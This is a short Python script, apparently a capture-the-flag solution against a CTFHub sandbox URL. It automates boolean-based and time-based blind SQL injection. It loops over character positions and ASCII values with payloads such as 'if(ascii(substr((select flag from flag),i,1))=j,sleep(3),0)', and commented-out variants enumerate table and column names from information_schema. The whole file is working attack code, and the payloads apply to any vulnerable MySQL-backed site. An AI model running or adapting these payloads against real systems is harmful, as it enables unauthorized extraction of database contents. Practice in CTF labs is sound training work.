import requests
url="http://challenge-66596ce9ae2dad89.sandbox.ctfhub.com:10800/"
key=""
def boool():
	key = ""
	for i in range(1,50):
		for j in range(1,140):
			##bool爆表爆列爆字段
			#if(条件，条件为真执行，条件为假执行)
			#table_name="?id=1 and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))={1},1,0)%23".format(str(i),str(j))
			#column_name="?id=1 and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),{0},1))={1},1,0)%23".format(str(i),str(j))
			flag="?id=1 and if(ascii(substr((select flag from flag),{0},1))={1},1,0)%23".format(str(i),str(j))
			#url1=url+table_name
			#url2=url+column_name
			url3=url+flag
			r=requests.get(url3, timeout=1.5)
			if "query_success" in r.text:
				key+=chr(j)
				print(key)
				break


def sleeep():
	key = ""
	for i in range(1,50):
		for j in range(1,140):
			##sleep爆表爆列爆字段
			#table_name="?id=0 ||if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))={1},sleep(3),0)%23".format(str(i),str(j))
			#column_name="?id=0 ||if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),{0},1))={1},sleep(3),0)%23".format(str(i),str(j))
			flag="?id=1 and if(ascii(substr((select flag from flag),{0},1))={1},sleep(3),0)%23".format(str(i),str(j))
			#url1=url+table_name
			#url2=url+column_name
			url3=url+flag
			try:
				r=requests.get(url3, timeout=1.5)
			except requests.exceptions.ReadTimeout:
				key+=chr(j)
				print(key)
				break

sleeep()